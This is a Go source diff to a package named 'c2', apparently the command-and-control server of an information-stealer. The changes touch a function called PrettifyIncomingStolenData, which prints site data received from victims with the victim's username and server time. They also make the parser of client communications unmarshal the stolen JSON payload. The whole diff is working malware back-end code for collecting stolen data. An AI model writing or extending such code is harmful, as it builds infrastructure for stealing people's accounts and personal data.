@@ -1,10 +1,12 @@
 package c2
 
 import (
+	"encoding/json"
 	"errors"
 	"fmt"
 	"log"
 	"strings"
+	"time"
 )
 
 /**
@@ -17,7 +19,13 @@ func PrettifyIncomingStolenData(jsonObject map[string]interface{}, username stri
 	const TERMINATOR = ";>|;}|;|£ "
 	const KEY_VAL_DELIM = "|<£||>"
 
-	fmt.Println("Incoming data from username: ", username)
+	fmt.Printf("Summary of sites data extracted for user %s, received at server time %s:\n", username, time.Now())
+
+	for key := range jsonObject {
+		fmt.Println(key)
+	}
+
+	fmt.Printf("Incoming data from username: %s, received at server time %s\n", username, time.Now())
 
 	for site, value := range jsonObject {
 		valueStr, ok := value.(string)
@@ -60,14 +68,6 @@ func PrettifyIncomingStolenData(jsonObject map[string]interface{}, username stri
 
 	}
 
-	fmt.Println()
-	fmt.Println()
-	fmt.Printf("Summary of sites data extracted for user %s:\n", username)
-
-	for key := range jsonObject {
-		fmt.Println(key)
-	}
-
 	return nil
 }
 
@@ -87,11 +87,21 @@ func GetUsername(dataString string) string {
 }
 
 // search for first instance of {" indicating start of json object in input string from client
-func GetJSONBodyFromComms(dataString string) (string, error) {
+func GetJSONBodyFromComms(dataString string) (map[string]interface{}, error) {
 	jsonStartingIndex := strings.Index(dataString, "{\"")
 	if jsonStartingIndex == -1 {
-		return "", errors.New("could not get starting index of JSON body")
+		return nil, errors.New("could not get starting index of JSON body")
 	}
 
-	return dataString[jsonStartingIndex:], nil
+	// a map of strings where we will write our parsed json data to
+	var jsonObject map[string]interface{}
+
+	// use the starting index to unmarshal the rest of the body (i.e. the JSON)
+	err := json.Unmarshal([]byte(dataString[jsonStartingIndex:]), &jsonObject)
+	if err != nil {
+		fmt.Println("BAD Error in parsing JSON ", err)
+		return nil, errors.New("error in parsing JSON")
+	}
+
+	return jsonObject, nil
 }
